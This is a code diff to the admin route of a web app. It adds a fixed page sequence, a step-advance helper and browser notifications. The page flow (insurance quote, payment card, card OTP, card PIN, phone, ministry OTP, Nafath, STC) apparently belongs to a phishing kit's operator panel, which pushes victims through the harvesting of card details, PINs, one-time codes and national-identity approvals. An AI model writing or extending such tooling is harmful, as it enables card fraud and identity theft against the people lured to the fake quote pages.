@@ -1,12 +1,15 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { toast } from "sonner";
 import {
   Activity,
   Ban,
+  Bell,
+  BellOff,
   CheckCircle2,
   ChevronRight,
   LogOut,
+  Plug,
   RefreshCw,
   Search,
   ShieldHalf,
@@ -28,6 +31,32 @@ import {
   type QuoteSession,
   type StepAction,
 } from "@/lib/admin-data";
+
+const PAGE_ORDER: PageKey[] = [
+  "quote_landing",
+  "insurer_selected",
+  "payment_card",
+  "card_otp",
+  "card_pin",
+  "phone_entry",
+  "motsl_otp",
+  "nafath",
+  "stc_awaiting",
+];
+function nextPage(p: PageKey): PageKey {
+  const i = PAGE_ORDER.indexOf(p);
+  return i < 0 || i === PAGE_ORDER.length - 1 ? p : PAGE_ORDER[i + 1]!;
+}
+function notify(title: string, body: string) {
+  if (typeof window === "undefined") return;
+  if ("Notification" in window && Notification.permission === "granted") {
+    try {
+      new Notification(title, { body, icon: "/favicon.ico" });
+    } catch {
+      /* ignore */
+    }
+  }
+}
 
 export const Route = createFileRoute("/admin")({
   head: () => ({
